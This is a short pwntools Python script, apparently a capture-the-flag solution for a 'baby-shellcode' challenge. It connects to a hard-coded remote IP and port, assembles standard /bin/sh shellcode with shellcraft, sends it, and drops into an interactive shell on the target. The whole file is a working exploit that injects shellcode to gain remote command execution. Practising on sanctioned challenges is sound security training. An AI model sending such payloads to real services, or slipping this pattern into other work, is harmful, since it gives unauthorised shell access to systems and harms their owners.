from pwn import *

elf = context.binary = ELF("./baby-shellcode")

host, port = "34.28.147.7", 5000
conn = remote(host, port)
# conn = elf.process()

payload = asm(shellcraft.sh())
print(payload)

conn.sendline(payload)

conn.interactive()
